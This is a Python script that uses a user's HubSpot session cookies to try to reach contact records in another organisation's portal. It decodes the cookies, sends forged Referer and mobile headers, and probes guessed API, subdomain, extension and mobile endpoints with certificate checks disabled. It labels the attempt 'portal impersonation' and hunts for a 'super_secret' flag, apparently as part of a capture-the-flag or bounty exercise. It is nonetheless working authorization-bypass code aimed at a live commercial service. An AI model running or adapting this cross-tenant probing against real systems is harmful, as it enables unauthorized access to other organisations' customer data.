#!/usr/bin/env python3
"""
Analyze cookies for hidden auth tokens and try portal access tricks
"""

import requests
import json
import os
import urllib3
import re
import base64
from urllib.parse import unquote
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')

print("="*80)
print("Cookie Analysis & Portal Access Hacks")
print("="*80)

# Parse cookies
cookies = {}
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        cookies[key] = value

print(f"\nFound {len(cookies)} cookies:")
for key in sorted(cookies.keys()):
    value = cookies[key]
    print(f"  {key}: {value[:50]}{'...' if len(value) > 50 else ''}")

# Look for base64-encoded data
print("\n[*] Decoding base64-encoded cookies...")
for key, value in cookies.items():
    if len(value) > 20:
        try:
            # Try base64 decode
            decoded = base64.b64decode(value).decode('utf-8', errors='ignore')
            if any(c in decoded for c in ['{', '"', 'portal', 'user', 'hub']):
                print(f"\n  {key} (base64):")
                print(f"    {decoded[:200]}")

                # Try to parse as JSON
                try:
                    data = json.loads(decoded)
                    print(f"    JSON: {json.dumps(data, indent=6)[:300]}")
                except:
                    pass
        except:
            pass

# Look for portal IDs in cookies
print("\n[*] Looking for portal IDs in cookies...")
for key, value in cookies.items():
    if TARGET_PORTAL in value or MY_PORTAL in value:
        print(f"  Found portal ID in {key}: {value[:100]}")

# Extract email from cookies
email = cookies.get('hs_login_email', '')
print(f"\n[*] Logged in as: {unquote(email)}")

# ============================================================================
# TRY PORTAL IMPERSONATION
# ============================================================================

print("\n[*] Trying portal impersonation techniques...")

headers = {
    'Cookie': SESSION_COOKIES,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Referer': f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/',
    'Origin': 'https://app.hubspot.com',
}

# Add CSRF
csrf = cookies.get('hubspotapi-csrf', cookies.get('csrf.app', ''))
if csrf:
    headers['X-HubSpot-CSRF-hubspotapi'] = csrf

# Try to switch portal context by visiting the portal page first
print("\n  1. Loading target portal contact page to set context...")
try:
    r = requests.get(
        f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1',
        headers=headers,
        verify=False,
        timeout=10,
        allow_redirects=True
    )
    print(f"     Status: {r.status_code}")

    # Check if we got new cookies
    if 'set-cookie' in r.headers:
        print(f"     Got new cookies!")
        new_cookies = r.headers['set-cookie']
        print(f"     {new_cookies[:200]}")

        # Update our session
        session = requests.Session()
        session.cookies.update(r.cookies)

        # Now try API call with updated session
        api_url = f'https://app.hubspot.com/api/crm-objects/v1/objects/0-1/1?portalId={TARGET_PORTAL}'
        r2 = session.get(api_url, headers=headers, verify=False, timeout=5)
        print(f"     API call after portal page load: {r2.status_code}")

        if r2.status_code == 200:
            print(f"     *** SUCCESS after context switch! ***")
            data = r2.json()
            print(json.dumps(data, indent=2)[:500])
except Exception as e:
    print(f"     Error: {e}")

# ============================================================================
# TRY DIFFERENT DOMAIN PATTERNS
# ============================================================================

print("\n[*] Trying different domain patterns...")

domains = [
    'app.hubspot.com',
    'api.hubspot.com',
    'api.hubapi.com',
    f'app-{TARGET_PORTAL}.hubspot.com',
    f'{TARGET_PORTAL}.hubspot.com',
]

endpoints = [
    f'/api/crm-objects/v1/objects/0-1/1?portalId={TARGET_PORTAL}',
    f'/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}',
    f'/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL}',
]

for domain in domains:
    for endpoint in endpoints:
        url = f'https://{domain}{endpoint}'
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=3)
            if r.status_code == 200:
                print(f"  *** HIT: {url}")
                try:
                    data = r.json()
                    if 'super_secret' in json.dumps(data).lower():
                        print(f"  *** SUPER_SECRET FOUND! ***")
                        print(json.dumps(data, indent=2))
                except:
                    pass
        except:
            pass

# ============================================================================
# TRY INTERNAL CHROME EXTENSION API
# ============================================================================

print("\n[*] Trying HubSpot Chrome extension APIs...")

# HubSpot has Chrome extensions - they might use special APIs
extension_endpoints = [
    f'https://app.hubspot.com/api/extension/contacts/{TARGET_PORTAL}/1',
    f'https://app.hubspot.com/api/chrome/contacts/{TARGET_PORTAL}/1',
    f'https://app.hubspot.com/api/integrations/contacts/{TARGET_PORTAL}/1',
]

for url in extension_endpoints:
    try:
        r = requests.get(url, headers=headers, verify=False, timeout=3)
        if r.status_code == 200:
            print(f"  Found: {url}")
            try:
                data = r.json()
                if 'super_secret' in json.dumps(data).lower():
                    print(f"  *** FLAG FOUND! ***")
                    print(json.dumps(data, indent=2))
            except:
                pass
    except:
        pass

# ============================================================================
# TRY WEBSOCKET ENDPOINTS
# ============================================================================

print("\n[*] Checking for WebSocket endpoints...")

# Look for ws:// or wss:// patterns
if 'ws' in SESSION_COOKIES.lower():
    print("  WebSocket-related data found in cookies")

# Common WebSocket paths
ws_paths = [
    f'/ws/contacts?portalId={TARGET_PORTAL}',
    f'/websocket/contacts?portalId={TARGET_PORTAL}',
    f'/realtime/contacts?portalId={TARGET_PORTAL}',
]

print("  (WebSocket testing requires different library - noted for manual testing)")

# ============================================================================
# TRY MOBILE API ENDPOINTS
# ============================================================================

print("\n[*] Trying mobile app API endpoints...")

mobile_headers = headers.copy()
mobile_headers['User-Agent'] = 'HubSpot/1.0 (iOS; iPhone)'
mobile_headers['X-HubSpot-Mobile'] = 'true'

mobile_endpoints = [
    f'https://api.hubspot.com/mobile/v1/contacts/{TARGET_PORTAL}/1',
    f'https://app.hubspot.com/mobile-api/contacts/{TARGET_PORTAL}/1',
    f'https://m.hubspot.com/api/contacts/{TARGET_PORTAL}/1',
]

for url in mobile_endpoints:
    try:
        r = requests.get(url, headers=mobile_headers, verify=False, timeout=3)
        if r.status_code == 200:
            print(f"  Mobile API hit: {url}")
            try:
                data = r.json()
                if 'super_secret' in json.dumps(data).lower():
                    print(f"  *** FLAG FOUND VIA MOBILE API! ***")
                    print(json.dumps(data, indent=2))
            except:
                pass
    except:
        pass

print("\n" + "="*80)
print("Cookie Analysis Complete")
print("="*80)
